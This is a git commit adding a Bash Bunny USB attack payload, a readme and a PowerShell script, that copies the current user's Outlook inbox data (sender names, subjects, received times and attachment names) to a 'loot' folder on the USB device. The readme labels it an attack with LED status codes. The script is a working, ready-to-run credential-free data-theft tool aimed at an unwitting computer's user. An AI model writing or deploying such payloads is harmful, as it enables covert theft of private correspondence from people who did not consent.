cab058991b726a3e877cbf7e6e763b20a3b5b29f
Murty007 <murtonpaul@hotmail.com>
2017-08-22 14:07:16 +0100

    Set of Outlook analysis payloads
    Payloads to extract details from a users Outlook Inbox, Sent Items, Deleted items, and contacts. All output to CSV files

---
+++ Outlook Inbox/readme.md
@@ -0,0 +1,18 @@
+
+Author : Paul Murton
+
+Captures the current users Outlook Inbox, and dumps the output
+CSV file in the folder \loot\OutlookInbox
+
+Tested on ver 1.3
+
+## STATUS
+
+| LED              | Status                                |
+| ---------------- | ------------------------------------- |
+| Purple (blinking)| Attack in progress                    |
+| Green (blinking) | Attack Finished                       |
+
+
+
+
---
+++ Outlook Inbox/run.ps1
@@ -0,0 +1,41 @@
+#Get the path and file name that you are using for output
+# find connected bashbunny drive:
+$VolumeName = "bashbunny"
+$computerSystem = Get-CimInstance CIM_ComputerSystem
+$backupDrive = $null
+get-wmiobject win32_logicaldisk | % {
+    if ($_.VolumeName -eq $VolumeName) {
+        $backupDrive = $_.DeviceID
+    }
+}
+
+#See if a loot folder exist in usb. If not create one
+$TARGETDIR = $backupDrive + "\loot"
+if(!(Test-Path -Path $TARGETDIR )){
+    New-Item -ItemType directory -Path $TARGETDIR
+}
+
+#See if a info folder exist in loot folder. If not create one
+$TARGETDIR = $backupDrive + "\loot\OutlookInbox"
+if(!(Test-Path -Path $TARGETDIR )){
+    New-Item -ItemType directory -Path $TARGETDIR
+}
+
+#Create a path that will be used to make the file
+$datetime = get-date -f yyyy-MM-dd_HH-mm
+$backupPath = $backupDrive + "\loot\OutlookInbox\"
+
+#Create output from info script
+$TARGETDIR = $MyInvocation.MyCommand.Path
+$TARGETDIR = $TARGETDIR -replace ".......$"
+cd $TARGETDIR
+
+if (get-process -EA "SilentlyContinue" outlook | where {$_.ProcessName -eq "Outlook"})
+{
+Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
+$olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type] 
+$outlook = new-object -comobject outlook.application
+$namespace = $outlook.GetNameSpace("MAPI")
+$Inbox = $namespace.getDefaultFolder($olFolders::olFolderInBox)
+$Inbox.items |Select-Object -Property Sendername,Subject,ReceivedTime,@{name="Attachments";expression={$_.Attachments|%{$_.DisplayName}}} | export-csv $backupPath\OulookInbox-$datetime.csv
+}
